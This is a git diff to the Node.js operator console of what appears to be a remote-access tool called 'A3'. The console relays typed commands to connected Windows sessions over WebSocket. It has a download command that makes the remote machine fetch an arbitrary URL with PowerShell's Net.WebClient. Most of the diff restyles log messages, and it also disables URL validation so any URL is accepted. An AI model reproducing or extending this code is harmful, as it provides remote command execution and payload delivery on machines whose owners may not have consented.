@@ -39,6 +39,8 @@ wss.on('connection', function connection(ws) {
 		}else if(message.startsWith("##MESSAGE##")){
 			if(JSON.parse(message.replace("##MESSAGE##","")).type == "error"){
 				console.log("[".bold + "-".red + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
+			}else if(JSON.parse(message.replace("##MESSAGE##","")).type == "info"){
+				console.log("[".bold + "i".yellow + "] ".bold + JSON.parse(message.replace("##MESSAGE##","")).message.bold);
 			}
 		}else if (message.startsWith("hello")) {
 			workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
@@ -93,7 +95,7 @@ rl.on('line', (line) => {
 			var filename = string[2];
 			var path = string[3];
 			if(ValidURL(url)){
-				console.log("[".white + "+".blue + "]".white + "Download request sent ! Please wait while downloading...".bold);
+				console.log("[".white + "+".blue + "]".white + " Download request sent ! Please wait while downloading...".bold);
 				sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
 			}else{
 				console.log("[".white + "-".red + "]".white + " Wrong URL !");
@@ -113,25 +115,19 @@ rl.on('line', (line) => {
 	}else if(msg == "win_help"){
 		sessions[currentSession].send("help");
 	}else if(msg == "exit"){
-		console.log('Have a great day! A3 over.');
-	process.exit(0);
+		console.log("[".bold + "+".green + "] Have a great day ! ".bold + "A3".underline.cyan +  " over !".bold);
+		process.exit(0);
 	}else{
 		sessions[currentSession].send(msg);
 	}
 }).on('close', () => {
-	console.log("the request was cancelled. If you want to leave the console, type the command exit.")
+	console.log("");
+	console.log("[".bold + "I".magenta + "] The request was cancelled. If you want to leave the console, type \"exit\".".bold)
 	rl.prompt();
 });
 
 function ValidURL(str) {
-	var pattern = new RegExp('^(https?:\/\/)?'+ // protocol
-	  '((([a-z\d]([a-z\d-]*[a-z\d])*)\.)+[a-z]{2,}|'+ // domain name
-	  '((\d{1,3}\.){3}\d{1,3}))'+ // OR ip (v4) address
-	  '(\:\d+)?(\/[-a-z\d%_.~+]*)*'+ // port and path
-	  '(\?[;&a-z\d%_.~+=-]*)?'+ // query string
-	  '(\#[-a-z\d_]*)?$','i'); // fragment locater
-	if(!pattern.test(str)) {
-	  console.log("[".white + "+".red + "]".white + " Wrong URL !");
+	if(!true) {
 	  return false;
 	} else {
 	  return true;
